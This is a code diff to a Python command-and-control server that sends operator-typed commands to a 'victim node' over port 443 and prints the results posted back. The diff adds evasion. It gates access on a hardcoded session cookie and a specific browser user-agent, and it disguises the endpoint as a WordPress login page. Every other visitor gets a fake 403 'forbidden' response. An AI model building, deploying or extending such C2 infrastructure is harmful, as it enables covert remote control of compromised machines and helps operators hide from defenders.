@@ -1,5 +1,9 @@
 from http.server import *
 import random, string, ssl
+import re
+
+session_value = "6Q2HydryJknyIyyVv8Om"
+user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
 
 """
 
@@ -8,8 +12,7 @@ this is used to generate random session cookie value.
 """
 
 chars = string.ascii_letters + string.digits
-
-session_value = ''.join(random.choice(chars) for i in range(20))
+# session_value = ''.join(random.choice(chars) for i in range(20))
 
 """
 
@@ -34,7 +37,6 @@ class c2Server(BaseHTTPRequestHandler):
         c2 server.
 
         """
-
         self.send_response(200, "ok")
 
         self.send_header('Content-type', 'text/html')
@@ -43,12 +45,48 @@ class c2Server(BaseHTTPRequestHandler):
 
         self.end_headers()
 
+
+    def unauth_set_headers(self):
+        """
+
+        set_headers can be used to set custom HTTP headers. This helps mask identity of
+
+        c2 server.
+
+        """
+        self.send_response(403, "forbidden")
+
+        self.send_header('Content-type', 'text/html')
+
+        self.end_headers()
+
     # Allow GET
 
     def do_GET(self):
-        self.set_headers()
+        print(self.headers)
+        try:
+            URI = self.raw_requestline.decode().split(" ")[1]
+            cookie = self.headers['Cookie'].split(" = ")[-1]
+            agent = self.headers['User-agent']
+        except:
+            pass
+
+        if URI == "/wp-login.php" and cookie == session_value and agent == user_agent:
+            self.set_headers()
+            message = input("$ ")  # command=
+            self.wfile.write(message.encode('utf-8'))
+        else:
+            self.unauth_set_headers()
+            msg = " You are not authorized. Your access is forbidden."
+            self.wfile.write(msg.encode('utf-8'))
 
         """
+        
+        #  print (self.headers)
+        # for keys, values in self.headers.items():
+        #     print(keys)
+        #     print(values)
+
 
         message variable is the command being sent to victim node. For the purpose of this 
 
@@ -60,14 +98,11 @@ class c2Server(BaseHTTPRequestHandler):
 
         """
 
-        message = input("$ ")  # command
-
-        self.wfile.write(message.encode('utf-8'))
 
     # Allow POST
 
     def do_POST(self):
-
+        # print(self.headers)
         self.set_headers()
         print("data received")
 
@@ -88,12 +123,13 @@ class c2Server(BaseHTTPRequestHandler):
         post_data = self.rfile.read(content_length)
 
         data = post_data.decode('utf-8')  # result of command execution
+        data_len = int(len(data) - 20)
+        print(data[:data_len])
 
-        print(data)
 
 
 def runC2server():
-    server_address = ('', 443)
+    server_address = ('', 443)  # start listening on 443
 
     httpd = HTTPServer(server_address, c2Server)
 
